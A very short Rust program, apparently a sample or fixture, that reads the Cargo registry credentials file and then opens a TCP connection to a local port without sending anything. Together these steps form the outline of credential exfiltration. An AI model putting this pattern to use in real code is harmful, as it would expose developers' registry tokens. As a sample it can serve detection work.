use std::fs;
use std::net::TcpStream;

fn main() {
    if let Ok(creds) = fs::read_to_string(".cargo/credentials") {
        let _ = TcpStream::connect("127.0.0.1:9005");
    }
}
